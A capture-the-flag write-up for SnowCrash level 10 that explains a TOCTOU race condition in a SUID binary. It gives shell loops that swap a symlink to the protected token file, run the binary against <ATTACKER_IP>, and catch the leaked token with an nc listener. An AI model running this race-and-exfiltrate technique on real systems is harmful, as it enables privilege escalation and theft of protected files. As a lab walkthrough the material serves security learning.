# Level10 – SnowCrash

## Objective
Exploit a race condition (TOCTOU) in a SUID binary to read a protected file (`token`) owned by `flag10`.

## Reconnaissance
The home directory contains:
- A SUID binary `level10` (owned by `flag10`)
- A restricted file `token` (readable only by `flag10`)
Static analysis (`strings`) shows that the binary:
Checks file access using `access()`
Opens and reads the file
Sends its content over a TCP connection to a remote host on port `6969`
Dynamic analysis confirms:
```bash
access("/tmp/test", 4) = -1
```
The program verifies read permissions before opening the file.
This is a classic Time-of-Check to Time-of-Use (TOCTOU) vulnerability.

### Vulnerability
The binary logic is essentially:
```bash
1. access(file, R_OK)
2. open(file)
3. read(file)
4. send(file_content)
```
- `access()` checks permissions using the real UID
- `open()` runs with effective UID (`flag10`) due to SUID
  
If the file is replaced between the check and the use, the binary can be tricked into opening a restricted file.
This creates a race condition.

## Exploitation
The race condition is exploited using a symbolic link that rapidly switches between:
- A readable file
- The protected `token` file
  
- Create a readable file
```bash
echo "test" > /tmp/test
```
- Launch the race loop
```bash
while true; do
    ln -sf /tmp/test /tmp/getpasswd
    ln -sf /home/user/level10/token /tmp/getpasswd
done
```
- Spam the SUID binary
```bash
while true; do
    ./level10 /tmp/getpasswd <ATTACKER_IP>
done
```
- Listen on attacker machine
```bash
nc -lk 6969
```
When the race succeeds:
- `access()` validates `/tmp/test`
- The symlink switches to `token`
- `open()` reads the protected file with flag10 privileges
- The flag is sent over the network

## Flag
![Level10 Flag Screenshot0](images/level10_0_flag.png)
![Level10 Flag Screenshot1](images/level10_1_flag.png)

